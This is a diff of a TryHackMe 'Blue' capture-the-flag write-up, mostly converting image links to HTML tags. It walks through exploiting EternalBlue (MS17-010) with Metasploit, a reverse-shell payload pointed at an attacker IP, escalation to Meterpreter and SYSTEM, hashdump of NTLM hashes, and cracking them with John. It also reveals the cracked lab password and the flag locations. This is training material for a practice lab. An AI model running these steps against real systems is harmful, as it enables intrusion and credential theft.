@@ -1,23 +1,26 @@
 # TryHackMe — Blue WriteUp
+<img width="1063" height="699" alt="image" src="https://github.com/user-attachments/assets/3d612c0f-9ebd-478d-ad42-298d25cb1c01" />
 
-**Room**: [Blue](https://tryhackme.com/room/blue)
-**Category**: Exploitation of SMB & Windows
+**Room**: [Blue](https://tryhackme.com/room/blue) <br>
+**Category**: Exploitation of SMB & Windows <br>
 **Description**: Demonstrate EternalBlue exploitation on a vulnerable Windows host.
 
----
+
+
 ## Tools
 - **Nmap** (service/OS and vulnerability scripts)
 - **Metasploit** (exploit and post modules)
 - **John** (password cracking)
----
+
+
 ## Target
-- IP: `10.201.74.172` (exported as an environment variable for convenience)
+IP: `10.201.74.172` (exported as an environment variable for convenience)
 ```bash
 # Set target IP for easier command reuse
 export IP=10.201.74.172
 ```
 
----
+
 # Task 1: Recon
 
 To start I performed an Nmap scan to identify open ports, services, and potential vulnerabilities:
@@ -25,7 +28,9 @@ To start I performed an Nmap scan to identify open ports, services, and potentia
 nmap -sV -sC -sS -T4 --script vuln $IP
 ```
 
-![[Pasted image 20250923144301.png]]
+<img width="619" height="568" alt="Pasted image 20250923144301" src="https://github.com/user-attachments/assets/0c4f7be7-0ddb-4aff-89dd-aad401894ba3" />
+<br><br>
+
 **Nmap scan findings**:
 - Port 445 open and using `microsoft-ds` (SMB)
 - OS fingerprint: Windows 7 Professional
@@ -33,6 +38,8 @@ nmap -sV -sC -sS -T4 --script vuln $IP
 **Answers (TryHackMe)**
 - Number of open ports under 1000: **3**
 - Vulnerability identified: **ms17-010**
+
+
 # Task 2: Gain Access 
 Metasploit has a module for this exploit, so I started Metasploit to exploit MS17-010.
 
@@ -40,10 +47,14 @@ Metasploit has a module for this exploit, so I started Metasploit to exploit MS1
 ```bash
 exploit/windows/smb/ms17_010_eternalblue
 ```
-![[Pasted image 20250923145316.png]]
 
-I selected the first module and ran `show options`:
-![[Pasted image 20250923145833.png]]
+<img width="978" height="739" alt="Pasted image 20250923145316" src="https://github.com/user-attachments/assets/a67ed15f-a3ca-490d-8962-caaa24f87037" />
+
+<br><br>
+
+I selected the first module and ran `show options`: <br><br>
+<img width="985" height="486" alt="Pasted image 20250923145833" src="https://github.com/user-attachments/assets/a73ceab8-8cdf-4763-acb5-fcc387ceeb61" />
+
 
 I set the required options:
 ```bash
@@ -54,58 +65,68 @@ set payload windows/x64/shell/reverse_tcp
 #replace <attacker_IP> to my IP
 ```
 
-**Result:** Then I ran with these options set. It was a successful exploitation and a shell was obtained:
-![[Pasted image 20250923153221.png]]
-# Task 3: Escalate 
-Next I upgraded the shell to a Meterpreter. I backgrounded the previously gained shell (CTRL+Z):
-![[Pasted image 20250923153422.png]]
+**Result:** Then I ran with these options set. It was a successful exploitation and a shell was obtained: <br><br>
+<img width="934" height="95" alt="Pasted image 20250923153221" src="https://github.com/user-attachments/assets/0bfd84d3-a559-4d42-a034-2e2c1c83fa55" />
+<br><br>
 
-I searched shell_to_meterpreter and it shows in the results:
-![[Pasted image 20250923153739.png]]
+# Task 3: Escalate
+Next I upgraded the shell to a Meterpreter. I backgrounded the previously gained shell (CTRL+Z): <br><br>
+<img width="544" height="83" alt="Pasted image 20250923153422" src="https://github.com/user-attachments/assets/263f3f3e-d946-4fd6-8f41-40eeb7a7e2eb" />
 
-I select:
+
+I searched shell_to_meterpreter and it shows in the results: <br><br>
+<img width="963" height="802" alt="Pasted image 20250923153739" src="https://github.com/user-attachments/assets/21e849c6-9faf-46da-9f4e-2fdbbb63fcc2" />
+
+
+I selected:
 ```bash
 post/multi/manage/shell_to_meterpreter
 ```
 
-and set SESSION to 1:
-![[Pasted image 20250923153855.png]]
+and set SESSION to 1: <br><br>
+<img width="826" height="616" alt="Pasted image 20250923153855" src="https://github.com/user-attachments/assets/c89ce434-faad-42de-8e42-9638bcefcf06" />
 
-![[Pasted image 20250923154135.png]]
+
+<img width="629" height="205" alt="Pasted image 20250923154135" src="https://github.com/user-attachments/assets/8a94feb0-15b4-495e-a988-39b4322613a6" /><br><br>
+
 
 After converting, I ran:
 - `sysinfo` to confirm target OS and session info
-- `getsystem` and `getuid` to verify SYSTEM privileges
+- `getsystem` and `getuid` to verify SYSTEM privileges 
 
-![[Pasted image 20250923155633.png]]
+<img width="556" height="404" alt="Pasted image 20250923155633" src="https://github.com/user-attachments/assets/0d08976c-a06a-4dae-b9de-b4a866948814" /> <br><br>
 
-I reviewed running processes and targeted `lsass` (a common process to extract credentials when privileged):
-![[Pasted image 20250923161119.png]]
-
+I reviewed running processes and targeted `lsass` (a common process to extract credentials when privileged): <br><br>
+<img width="572" height="395" alt="Pasted image 20250923161119" src="https://github.com/user-attachments/assets/8f385381-98fd-440b-acb1-3f0a862b847a" /> 
+<br><br>
 # Task 4: Cracking
-Next I run the command 'hashdump' and retrieved NTLM hashes for `Administrator`, `Guest`, and `Jon`:
+Next I ran the command 'hashdump' and retrieved NTLM hashes for `Administrator`, `Guest`, and `Jon`:<br><br>
+<img width="658" height="62" alt="Pasted image 20250923161335" src="https://github.com/user-attachments/assets/d234db07-951c-498e-b64b-ba09ec17af64" />
 
-![[Pasted image 20250923161335.png]]
 
 In another terminal I saved `Jon`'s NTLM hash to a file and cracked it with John:
 ```bash
 john hashes.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20250923162748.png]]
+<img width="722" height="475" alt="Pasted image 20250923162748" src="https://github.com/user-attachments/assets/4c6f58f7-e4fa-4925-9c69-c4ab498a3659" />
+
 
 **Cracked password for Jon:** `alqfna22`
 
 With that password I authenticated and accessed the filesystem to retrieve flags:
 
-First flag located at `C:\flag1.txt`
-![[Pasted image 20250923164710.png]]
+First flag located at `C:\flag1.txt` <br><br>
+<img width="581" height="503" alt="Pasted image 20250923164710" src="https://github.com/user-attachments/assets/8a16fba6-def3-4eb4-8b30-1653512aa3ee" />
 
-The next flag was located at `C:\Windows\System32\config\flag2.txt`
-![[Pasted image 20250923164410.png]]
 
-Third (final) flag found in user Jon's directory: `C:\Users\Jon\Documents\flag3.txt`
-![[Pasted image 20250923165329.png]]
+The next flag was located at `C:\Windows\System32\config\flag2.txt`<br><br>
+<img width="521" height="545" alt="Pasted image 20250923164410" src="https://github.com/user-attachments/assets/69557cf2-1235-4c2d-9574-f567fc6e4983" />
+
+
+Third (final) flag found in user Jon's directory `C:\Users\Jon\Documents\flag3.txt`<br><br>
+<img width="513" height="2051" alt="Pasted image 20250923165329" src="https://github.com/user-attachments/assets/74a2abb9-3824-4a1a-8188-7c0afda33c43" />
+
 
 # Takeaways
 - **EternalBlue** targets SMBv1 and can allow remote code execution on unpatched Windows systems.
